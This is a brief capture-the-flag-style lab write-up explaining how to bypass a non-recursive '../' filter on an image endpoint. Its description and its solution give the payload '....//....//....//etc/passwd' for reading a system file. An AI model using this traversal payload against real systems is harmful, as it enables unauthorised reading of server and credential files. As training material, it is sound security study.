# Lab: File path traversal, traversal sequences stripped non-recursively
## Description

The application is fetching images like this `/image?filename=45.jpg`

It attempts to prevent path traversal by removing stripping (removing all occurences of) `../`. To bypass this we can do something like this:

`/image?filename=....//....//....//etc/passwd`

That will result in the following after `../` has been removed:

`../../../etc/passwd`

## Solution
`/image?filename=....//....//....//etc/passwd`
